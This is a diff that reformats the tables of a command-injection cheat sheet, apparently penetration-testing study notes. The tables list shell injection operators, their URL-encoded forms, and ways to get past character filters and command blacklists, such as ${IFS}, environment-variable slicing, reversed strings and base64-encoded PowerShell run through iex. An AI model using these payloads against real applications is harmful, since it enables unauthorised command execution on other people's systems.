@@ -1,15 +1,15 @@
 ## Injection Operators
 
-|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
-|---|---|---|---|
-|Semicolon|`;`|`%3b`|Both|
-|New Line|`\n`|`%0a`|Both|
-|Background|`&`|`%26`|Both (second output generally shown first)|
-|Pipe|`\|`|`%7c`|Both (only second output is shown)|
-|AND|`&&`|`%26%26`|Both (only if first succeeds)|
-|OR|`\|`|`%7c%7c`|Second (only if first fails)|
-|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
-|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
+| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| Semicolon              | `;`                     | `%3b`                     | Both                                       |
+| New Line               | `\n`                    | `%0a`                     | Both                                       |
+| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
+| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
+| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
+| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
+| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
+| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
 
 ---
 
@@ -17,17 +17,17 @@
 
 ## Filtered Character Bypass
 
-|Code|Description|
-|---|---|
-|`printenv`|Can be used to view all environment variables|
-|**Spaces**||
-|`%09`|Using tabs instead of spaces|
-|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
-|`{ls,-la}`|Commas will be replaced with spaces|
-|**Other Characters**||
-|`${PATH:0:1}`|Will be replaced with `/`|
-|`${LS_COLORS:10:1}`|Will be replaced with `;`|
-|`$(tr '!-}' '"-~'<<<[)`|Shift character by one (`[` -> `\`)|
+| Code                    | Description                                                                        |
+| ----------------------- | ---------------------------------------------------------------------------------- |
+| `printenv`              | Can be used to view all environment variables                                      |
+| **Spaces**              |                                                                                    |
+| `%09`                   | Using tabs instead of spaces                                                       |
+| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
+| `{ls,-la}`              | Commas will be replaced with spaces                                                |
+| **Other Characters**    |                                                                                    |
+| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
+| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
+| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |
 
 ---
 
@@ -69,16 +69,19 @@
 
 ## Blacklisted Command Bypass
 
-|Code|Description|
-|---|---|
-|**Character Insertion**||
-|`'` or `"`|Total must be even|
-|`^`|Windows only (CMD)|
-|**Case Manipulation**||
-|`WhoAmi`|Simply send the character with odd cases|
-|**Reversed Commands**||
-|`"whoami"[-1..-20] -join ''`|Reverse a string|
-|`iex "$('imaohw'[-1..-20] -join '')"`|Execute reversed command|
-|**Encoded Commands**||
-|`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`|Encode a string with base64|
-|`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`|Execute b64 encoded string|
+| Code                                                                                                         | Description                              |
+| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
+| **Character Insertion**                                                                                      |                                          |
+| `'` or `"`                                                                                                   | Total must be even                       |
+| `^`                                                                                                          | Windows only (CMD)                       |
+| **Case Manipulation**                                                                                        |                                          |
+| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
+| **Reversed Commands**                                                                                        |                                          |
+| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
+| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
+| **Encoded Commands**                                                                                         |                                          |
+| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
+| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
+
+
+${HOME:0:1}
